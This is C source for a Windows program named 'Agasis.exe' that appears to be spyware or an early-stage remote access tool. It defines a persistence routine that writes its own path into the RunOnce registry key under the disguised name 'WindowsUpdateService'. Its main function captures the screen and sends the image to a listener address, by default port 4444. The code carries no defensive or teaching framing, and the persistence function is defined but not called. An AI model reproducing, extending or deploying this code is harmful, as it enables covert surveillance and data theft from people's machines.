#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "ws2_32.lib")

#include "lookscreen.h"
#include "usecommands.h"
#include "cloudtransfer.h"

// --- Configurations for Absolute Control ---
#define REGISTRY_KEY_NAME "WindowsUpdateService"
#define RUN_KEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

const char* LISTENER_IP = "192.168.23.15";
uint16_t LISTENER_PORT = 4444;

// --- The Ritual of Persistence (Registry Forge) ---
void ForgePersistence() {
    HKEY hkey;
    TCHAR currentPath[MAX_PATH];
    DWORD size = GetModuleFileName(NULL, currentPath, MAX_PATH);
    printf("\nSize: %d\tPath : %s", size, currentPath);
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, RUN_KEY_PATH, 0, KEY_SET_VALUE, &hkey);
    if (result == ERROR_SUCCESS) {
        printf("\n[INFO] Open registory editor on this path : %s ", RUN_KEY_PATH);
        RegSetValueEx(hkey, REGISTRY_KEY_NAME, 0, REG_SZ, (LPBYTE)currentPath, strlen(currentPath) + 1);
        RegCloseKey(hkey);
    }
    else {
        printf("[ERROR] Failed to open HKEY_CURRENT_USER\\%s. Error: %ld", RUN_KEY_PATH, result);
    }
}

static void usage() {
    printf("\nAgasis.exe [IP] <port>\n\tDefault Port 4444");
}

static int ip_Validation(const char* IP) {
    struct in_addr tmp4;
    struct in6_addr tmp6;
    if (inet_pton(AF_INET, IP, &tmp4) == 1) {
        return 1;
    }
    if ((inet_pton(AF_INET6, IP, &tmp6) == 1)) {
        return 1;
    }
    return 0;
}

static int port_Validation(const uint16_t PORT) {
    if (PORT < 1 || PORT > 65535) {
        return 0;
    }
    return 1;
}

unsigned char* hBitmap_to_bgra(HBITMAP hBitmap, int* out_sw, int* out_sh, int* out_stride, size_t* out_size) {
    if (!hBitmap) {
        return NULL;
    }

    BITMAP bmp;
    if (GetObject(hBitmap, sizeof(BITMAP), &bmp) == 0) {
        return NULL;
    }
    int width = bmp.bmWidth;
    int height = bmp.bmHeight;
    if (width <= 0 || height <= 0) {
        return NULL;
    }

    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biSizeImage = 0;

    int stride = width * 4;
    size_t bufSize = (size_t)stride * (size_t)height;
    unsigned char* pixels = (unsigned char*)malloc(bufSize);

    if (!pixels) {
        return NULL;
    }

    HDC hdc = GetDC(NULL);
    if (!hdc) {
        free(pixels);
        return NULL;
    }

    BITMAPINFO bInfo;
    ZeroMemory(&bInfo, sizeof(bInfo));
    bInfo.bmiHeader = bi;

    int lines = GetDIBits(hdc, hBitmap, 0, (UINT)height, pixels, &bInfo, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    if (lines != height) {
        free(pixels);
        return NULL;
    }
    if (out_sw) *out_sw = width;
    if (out_sh) *out_sh = height;
    if (out_stride) *out_stride = stride;
    if (out_size) *out_size = bufSize;

    return pixels;
}

// --- The Grand Loop (Resilient Connection) ---
int main(int argc, char* argv[]) {
    
    if (argc < 2 && !ip_Validation(LISTENER_IP)) {
        fprintf(stderr, "\n[ERROR] No LISTENER_IP specified.");
        usage();
        exit(1);
    }
    if (argc > 3) {
        fprintf(stderr, "\n[ERROR] Given parameters are not correct.");
        usage();
        exit(1);
    }

    if (argc >= 2) {
        LISTENER_IP = argv[1];
        if (ip_Validation(LISTENER_IP)) {
            printf("\n[INFO] Valid IP. Proceeding...");
        }
        else {
            fprintf(stderr, "\n[WARNING] %s is not a valid IPv4 or IPv6. Still loading...", LISTENER_IP);
        }
    }

    if (argc == 3) {
        char* endptr = NULL;
        LISTENER_PORT = (uint16_t)strtol(argv[2], &endptr, 10);
        if (!port_Validation(LISTENER_PORT)) {
            fprintf(stderr, "\n[ERROR] LISTENER_PORT is out of range (0-65535): %ld", LISTENER_PORT);
            LISTENER_PORT = 4444;
        }
    }
    else {
        LISTENER_PORT = 4444;
        printf("\n[WARNING] No LISTENER_PORT specified. Using default: %d", LISTENER_PORT);
    }

    printf("\n[INFO] Using LISTENER_IP: %s", LISTENER_IP);
    printf("\n[INFO] Using LISTENER_PORT: %d", LISTENER_PORT);

    // Capture screenshot
    DWORD size = 0;
    BYTE* buffer = CaptureScreen(&size);
    if (buffer) {
        printf("\n[INFO] Screenshot captured successfully (%lu bytes).\n", (unsigned long)size);

        // Save to local file
        if (!Save_Buffer_To_FIle(buffer, size, "screencap.png")) {
            printf("[ERROR] Failed to save the captured image.\n");
            free(buffer);
            exit(1);
        }
        printf("[INFO] Screenshot saved to screencap.png\n");

        // Send to cloud VM
        if (SendScreenShotToCloud(LISTENER_IP, LISTENER_PORT)) {
            printf("[INFO] Screenshot sent to cloud VM successfully.\n");
        }
        else {
            printf("[ERROR] Failed to send screenshot to cloud VM.\n");
        }

        free(buffer);
    }
    else {
        printf("[ERROR] Failed to capture screenshot.\n");
        exit(1);
    }

    return 0;
}